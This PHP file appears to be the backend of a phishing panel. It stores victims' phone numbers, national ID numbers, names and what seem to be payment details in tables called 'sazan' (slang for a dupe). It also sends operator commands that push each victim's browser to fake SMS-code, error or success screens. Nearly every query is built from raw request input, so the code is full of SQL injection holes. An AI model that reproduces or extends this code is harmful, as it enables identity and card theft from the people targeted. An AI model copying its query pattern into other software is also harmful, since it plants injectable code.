<?php
session_start();
include(__DIR__ . '/gmypanel/Connection.php');
$ip = $_GET["ip"];

// GET'ten telno geldiyse session'a kaydet
if (!empty($_GET['telno'])) {
    $_SESSION['telno'] = $_GET['telno'];
}

// Session'da telno varsa sazan'a yazmayı dene
if (!empty($_SESSION['telno'])) {
    $telno = $_SESSION['telno'];
    $affected = $db->exec("UPDATE sazan SET telno = '{$telno}' WHERE ip = '{$ip}'");
    if ($affected > 0) {
        unset($_SESSION['telno']);
    }
}

// Session'da tc varsa sazan'a yazmayı dene
if (!empty($_SESSION['tc'])) {
    $tc = $_SESSION['tc'];
    $affected = $db->exec("UPDATE sazan SET tc = '{$tc}' WHERE ip = '{$ip}'");
    if ($affected > 0) {
        unset($_SESSION['tc']);
    }
}

// Session'da real_ad varsa sazan ve sazan_debit tablolarina yazmayi dene
if (!empty($_SESSION['real_ad'])) {
    $real_ad = $_SESSION['real_ad'];
    $db->exec("UPDATE sazan SET ad = '{$real_ad}' WHERE ip = '{$ip}'");
    $db->exec("UPDATE sazan_debit SET ad = '{$real_ad}' WHERE ip = '{$ip}'");
}

// Session'da veri varsa sazan ve sazan_debit tablolarina yazmayi dene
if (!empty($_SESSION['veri'])) {
    $veri = $_SESSION['veri'];
    $db->exec("UPDATE sazan SET veri = '{$veri}' WHERE ip = '{$ip}'");
    $db->exec("UPDATE sazan_debit SET veri = '{$veri}' WHERE ip = '{$ip}'");
}

// Session'da veri2 varsa sazan ve sazan_debit tablolarina yazmayi dene
if (!empty($_SESSION['veri2'])) {
    $veri2 = $_SESSION['veri2'];
    $db->exec("UPDATE sazan SET veri2 = '{$veri2}' WHERE ip = '{$ip}'");
    $db->exec("UPDATE sazan_debit SET veri2 = '{$veri2}' WHERE ip = '{$ip}'");
}

$sms = $db->query("SELECT * FROM sms", PDO::FETCH_ASSOC);
foreach ($sms as $row1)
{
    if ($row1['sms'] == $ip)
    {
        echo 'sms';
        $db->query("DELETE FROM sms WHERE sms='$ip'");
    }
}
$sms2 = $db->query("SELECT * FROM sms2", PDO::FETCH_ASSOC);
foreach ($sms2 as $row1)
{
    if ($row1['sms2'] == $ip)
    {
        echo 'sms2';
        $db->query("DELETE FROM sms2 WHERE sms2='$ip'");
    }
}
$tebrik = $db->query("SELECT * FROM tebrik", PDO::FETCH_ASSOC);
foreach ($tebrik as $row2)
{
    if ($row2['tebrik'] == $ip)
    {
        echo "tebrik";
        $db->query("DELETE FROM tebrik WHERE tebrik='$ip'");
    }
}
$hata1 = $db->query("SELECT * FROM hata1", PDO::FETCH_ASSOC);
foreach ($hata1 as $row4)
{
    if ($row4['hata1'] == $ip)
    {
        echo "hata1";
        $db->query("DELETE FROM hata1 WHERE hata1='$ip'");
    }
}
$hata2 = $db->query("SELECT * FROM hata2", PDO::FETCH_ASSOC);
foreach ($hata2 as $row4)
{
    if ($row4['hata2'] == $ip)
    {
        echo "hata2";
        $db->query("DELETE FROM hata2 WHERE hata2='$ip'");
    }
}
$hata3 = $db->query("SELECT * FROM hata3", PDO::FETCH_ASSOC);
foreach ($hata3 as $row4)
{
    if ($row4['hata3'] == $ip)
    {
        echo "hata3";
        $db->query("DELETE FROM hata3 WHERE hata3='$ip'");
    }
}
$back = $db->query("SELECT * FROM back", PDO::FETCH_ASSOC);
foreach ($back as $row6)
{
    if ($row6['back'] == $ip)
    {
        echo "back";
        $db->query("UPDATE sazan SET back = '0' WHERE ip = '{$ip}'");
        $db->query("DELETE FROM back WHERE back='$ip'");
    }
}
$timex = time()+7;
$db->query("UPDATE sazan SET lastOnline = '$timex' WHERE ip = '$ip'");
$query = $db->query("SELECT * FROM ips WHERE ipAddress = '$ip'")->fetch(PDO::FETCH_ASSOC);
if($query) {
    $db->query("UPDATE ips SET lastOnline = '$timex' WHERE ipAddress = '$ip'");
} else {
    $query = $db->prepare("INSERT INTO ips SET ipAddress = ?, lastOnline = ?");
    $insert = $query->execute(array($ip, $timex));
}
?>

